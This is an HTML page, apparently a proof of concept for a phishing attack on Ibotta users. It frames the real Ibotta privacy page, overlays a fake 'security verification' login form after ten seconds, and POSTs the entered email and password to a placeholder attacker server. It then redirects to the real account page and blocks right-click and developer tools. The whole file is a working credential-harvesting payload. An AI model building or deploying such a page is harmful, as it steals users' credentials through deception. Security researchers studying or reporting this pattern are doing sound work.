<!DOCTYPE html>
<html>
<head>
  <title>Ibotta Security Verification</title>
  <style>
    #offer-overlay {
      display: none;
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      background: rgba(0, 0, 0, 0.8);
      z-index: 10000;
      justify-content: center;
      align-items: center;
      font-family: Arial, sans-serif;
    }
    #offer-box {
      background: white;
      padding: 30px;
      border-radius: 10px;
      text-align: center;
      max-width: 400px;
    }
    input, button {
      display: block;
      margin: 10px auto;
      padding: 10px;
      width: 80%;
      font-size: 16px;
    }
    iframe {
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      opacity: 1;
      z-index: 1;
      border: none;
    }
    #loading {
      display: none;
      color: green;
      font-weight: bold;
    }
    #error-message {
      display: none;
      color: red;
    }
  </style>
</head>
<body style="margin:0">

<iframe id="hidden-iframe" src="https://ibotta.com/personal-information-management#right-to-limit-processing"></iframe>

<div id="offer-overlay">
  <div id="offer-box">
    <h2>For security reasons for our sake and yours</h2>
    <p>Verify your account to configure account settings</p>
    <input type="email" id="user-email" placeholder="Enter your Ibotta email">
    <input type="password" id="user-password" placeholder="Enter your password">
    <button id="submit-login">Submit</button>
    <div id="loading">Verifying your credentials... Please wait</div>
    <div id="error-message">Verification failed. Please try again.</div>
  </div>
</div>

<script>
  // Block right-click and F12
  document.addEventListener('contextmenu', event => event.preventDefault());
  document.addEventListener('keydown', event => {
    if (event.key === 'F12' || (event.ctrlKey && event.shiftKey && event.key === 'I')) {
      event.preventDefault();
    }
  });

  // Show the overlay form after 10 seconds
  setTimeout(() => {
    document.getElementById('offer-overlay').style.display = 'flex';
  }, 10000);

  document.getElementById('submit-login').addEventListener('click', async () => {
    const email = document.getElementById('user-email').value;
    const password = document.getElementById('user-password').value;
    
    if (!email || !password) {
      document.getElementById('error-message').style.display = 'block';
      return;
    }

    // Show loading message
    document.getElementById('submit-login').style.display = 'none';
    document.getElementById('loading').style.display = 'block';
    document.getElementById('error-message').style.display = 'none';

    try {
      // 1. Send credentials to attacker server
      await fetch('private-controlled-server/burp collaborator/oast server', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, password })
      });

      

      // 2. Only redirect after successful operations
      setTimeout(() => {
        window.location.href = 'https://ibotta.com/account';
      }, 3000);

    } catch (err) {
      console.error("Error:", err);
      document.getElementById('loading').style.display = 'none';
      document.getElementById('error-message').style.display = 'block';
      document.getElementById('submit-login').style.display = 'block';
    }
  });
</script>
</body>
</html>
